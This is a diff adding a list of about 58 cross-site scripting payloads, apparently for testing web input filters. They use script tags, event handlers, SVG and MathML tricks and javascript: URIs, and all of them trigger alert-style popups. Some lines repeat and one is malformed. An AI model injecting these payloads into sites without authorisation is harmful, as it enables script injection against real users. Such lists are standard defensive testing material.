@@ -1,0 +1,58 @@
+" onmouseover=alert('XSS') x="
+"><svg/onload=confirm(1)>
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+" onmouseover=alert(1) "
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+" onmouseover=alert(1) "
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<math><mtext></mtext><mtext><img src=x onerror=alert(1)></mtext></math>
+<video><source onerror=\"javascript:alert(1)\"></video>
+<details open ontoggle=alert(1)>
+<body onload=alert(1)>
+<marquee onstart=alert(1)>
+<svg><animate attributeName=\"x\" values=\"0;10\" dur=\"1s\" repeatCount=\"indefinite\" onbegin=\"alert(1)\"></animate></svg>
+<svg><set attributeName=\"x\" to=\"10\" begin=\"0s\" onbegin=\"alert(1)\" /></svg>
+<embed src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>\">
+<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>
+<svg><script xlink:href=\"data:,alert(1)\"></script></svg>
+<svg><a xlink:href=\"javascript:alert(1)\"><text>CLICK</text></a></svg>
+<isindex prompt=\"><script>alert(1)</script>\">
+<img src=x onerror=\"alert('XSS')\">
+<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>
+<video><track onload=alert(1)></video>
+<math><script>alert(1)</script></math>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+<svg><script href=\"data:text/javascript,alert(1)\" /></svg>
+<svg><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(1)\"><text>Test</text></a></svg>
+<svg><style>@import 'javascript:alert(1)';</style></svg>
+<svg><style>*{x:expression(alert(1))}</style></svg>
+\";alert(1);// 
+</script><script>alert(1)</script>
+</style><script>alert(1)</script>
+\"><svg/onload=alert(1)>
+<iframe srcdoc='<script>alert(1)</script>'>
+<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>
+<svg><style>*{animation-name:x} @keyframes x{from{transform:rotate(0)} to{transform:rotate(360deg);alert(1)}</style></svg>
+<svg><circle onfocus=alert(1) tabindex=1></circle></svg>
+<object data=\"javascript:alert(1)\">
+<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>
+<svg><script>alert(String.raw`1`)</script></svg>
+<svg><script>alert(`${1}`)</script></svg>
+<svg><script>eval(\"alert(1)\")</script></svg>
+<svg><script>Function(\"alert(1)\")()</script></svg>
+<svg><script>window </script></svg>
+<svg><script>top[8680439..1]=alert(1)</script></svg>
+<svg><script>this.alert(1)</script></svg>
+<svg><script>parent.alert(1)</script></svg>
+<svg><script>frames[0].alert(1)</script></svg>
+<svg><script>setTimeout(() => alert(1), 100)</script></svg>
+<svg><script>location=`javascript:alert(1)`</script></svg>
+<svg><script>document.write('<script>alert(1)<\\/script>')</script></svg>
+<svg><script>confirm(1)</script></svg>
+<svg><script>prompt(1)</script></svg>
